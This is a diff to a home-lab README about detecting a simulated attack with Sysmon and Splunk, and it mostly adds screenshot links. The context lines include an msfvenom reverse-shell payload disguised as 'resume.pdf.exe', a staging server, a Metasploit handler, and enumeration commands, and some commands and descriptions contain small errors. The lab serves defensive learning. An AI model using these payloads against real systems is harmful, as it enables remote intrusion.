@@ -32,6 +32,9 @@ cd C \Sysmon
 3) Step 3 : Verify
 • Open Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> Sysmon -> Operational.
 
+![Sysmon Installation](sysmon_installation.png)
+![Verify Sysmon Installation](verify_sysmon_instalation.png)
+
 ### 2. Splunk Enterprise
 The heavy duty SIEM software engine. Which ingests raw log files, breaks them down into searchable fields, lets you run complex queries, and builds dashboards.
 
@@ -45,6 +48,9 @@ The heavy duty SIEM software engine. Which ingests raw log files, breaks them do
 2) Step 2 : Install Splunk Technology Add-ons
 • Splunk Add-on for Microsoft Windows
 • Splunk Add-on for Sysmon
+
+![Splunk Installation](splunk_instalation.png)
+![Splunk web interface Login](splunk_web_interface_login.png)
 
 ### 3. Ingest Sysmon logs into Splunk
 * **Configuration Steps ~**
@@ -69,6 +75,7 @@ index = endpoint
 • Click on the Services tab
 • Locate Splunkd, right-click it, and select Restart
 
+![Sysmon Configuration Xml](sysmon_configuration_xml.png)
 ---
 
 ## Phase 2 ~ Attack Lifecycle Simulation
@@ -80,15 +87,20 @@ This phase outlines the simulated attack methodology executed from the Kali Linu
 ```bash
 nmap -p 3389 192.168.64.13
 ```
+
 ### 2. Weaponization & Payload Delivery
 * **Msfvenom Payload Generation :** Executed an aggressive service and script scan against the target asset to identify active entry pathways ~
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.64.6 LPORT-4444 -f exe -o resume.pdf.exe
 ```
+![Reconnaissance and Weaponization](active_reconnaissance.png)
+
 * **Staging Server Deployment :** Launched a lightweight Python HTTP application server to stage the malicious artifact for retrieval ~
 ```bash
 python3 -m http.server 9999
 ```
+![Server Deployment](server_deployment.png)
+
 ### 3. Command & Control (C2) Exploitation
 * **Metasploit Multi Handler Console :** Activated the backend socket handler on the Kali infrastructure to listen for inbound beacon calls from the target endpoint ~
 ```bash
@@ -101,12 +113,16 @@ set LHOST 192.168.64.6
 set LPORT 4444
 exploit
 ```
+![C2 Exploitation](command_control_exploitation.png)
+
 * **Post-Exploitation Enumeration Commands :** Upon payload execution, an interactive interactive command terminal shell (cmd) was successfully obtained. The following tactical host-reconnaissance commands were performed through the stream ~
 ```bash
 whoami      # Verified current user context ("Jay")
 net user    # Enumerated all configured local accounts on the system
 ipconfig    # Profiled network interface details and verified IP tracking
 ```
+![Post Exploitation Enumeration Commands](post_exploitation_enumeration.png)
+
 ---
 
 ## Phase 3 ~ Splunk Ingestion & Forensic Telemetry Analysis
@@ -117,17 +133,25 @@ This final phase showcases the log verification and analytical troubleshooting m
 ```splunk
 index=endpoint "resume.pdf.exe"
 ```
+![Query 1](query_optimization_1.png)
+
 ```splunk
 index=endpoint "resume.pdf.exe" | rex field=_raw "Image'>(?<Image>[^<]+)" | rex field=_raw "CommandLine'>(<CommandLine>[^<]+)" | table _time, EventID, Image, CommandLine
 ```
+![Query 2](query_optimization_2.png)
+
 ### 2. Forensic Timeline Event Breakdown
 The execution of the custom query uncovered an absolute match with the simulated timeline of the compromise
+
+![Forensic Timeline](forensic_timeline_event_breakdown.png)
 
 ---
 
 ## Phase 4 ~ Defensive Remediations & Incident Containment
 
 Following analysis, tactical incident responses were initiated to clean the environment and restore the security baseline
+
+![Check Payload still in system](process_eradication.png)
 
 1) Process Eradication ~ Validated structural
 process termination within Windows memory
